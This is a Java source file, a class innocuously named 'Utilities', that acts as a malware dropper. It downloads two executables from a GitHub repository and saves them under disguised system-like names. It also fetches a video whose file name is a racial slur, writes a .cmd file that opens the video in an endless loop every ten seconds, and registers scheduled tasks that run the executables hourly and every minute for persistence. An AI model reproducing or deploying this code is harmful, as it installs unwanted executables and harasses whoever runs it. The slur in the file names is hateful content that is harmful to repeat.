package utils;

import java.io.*;
import java.net.URL;
import java.nio.channels.FileChannel;
import java.nio.file.Files;

public class Utilities {
    private final String user = System.getProperty("user.name");

    private final String path_1 = "C:/ProgramData/WinSys.exe";
    private final String path_2 = "C:\\Users\\" + user + "\\AppData\\Local\\Temp\\SystemDebug.exe";
    private final String path_video = "C:\\Users\\Public\\Videos\\NIGGERS.mp4";
    private final String path_video_1 = "C:\\Users\\Public\\Videos\\NIGGERS.txt";
    private final String path_video_2 = "C:\\Users\\Public\\Videos\\NIGGERS.cmd";


    public void Downloading_Sys() throws IOException {
        File file = new File(this.path_1);
        if(!file.exists())
        {
            String link_1 = "https://github.com/BibAss/JopaRes/raw/main/SystemDebug.exe";
            URL url = new URL(link_1);
            InputStream inputStream = url.openStream();
            Files.copy(inputStream, new File(this.path_1).toPath());
        }
    }

    public void Downloading_Debug() throws IOException {
        File file = new File(this.path_2);
        if (!file.exists()) {
            String link_2 = "https://github.com/BibAss/JopaRes/raw/main/WinSys.exe";
            URL url = new URL(link_2);
            InputStream inputStream = url.openStream();
            Files.copy(inputStream, new File(this.path_2).toPath());
        }
    }

    public void Downloading_Video() throws IOException {
        File file = new File(this.path_video);
        if (!file.exists()) {
            String link_video = "https://github.com/BibAss/JopaRes/raw/main/NIGGERS.mp4";
            URL url = new URL(link_video);
            InputStream inputStream = url.openStream();
            Files.copy(inputStream, new File(this.path_video).toPath());
        }
    }

    public void Downloading_File() throws IOException {
        File file = new File(this.path_video_1);
        FileWriter writer = new FileWriter(file);
        writer.write(path_video);
        writer.flush();
        writer.close();
        FileChannel sourceChannel = null;
        FileChannel destChannel = null;
        sourceChannel = new FileInputStream(path_video_1).getChannel();
        destChannel = new FileOutputStream(path_video_2).getChannel();
        destChannel.transferFrom(sourceChannel, 0, sourceChannel.size());
        sourceChannel.close();
        destChannel.close();
    }

    public void Exe_Video() throws IOException, InterruptedException {
        while(true)
        {
            Runtime.getRuntime().exec( path_video_2 );
            Thread.sleep(10000);
        }
    }

    public void AutoLoad() throws IOException {
        Runtime.getRuntime().exec("schtasks /create /tn WinRun /tr " + path_1 + " /sc hourly /F");
        Runtime.getRuntime().exec("schtasks /create /tn SystemUpdate /tr " + path_2 + " /sc minute /F");
    }
}
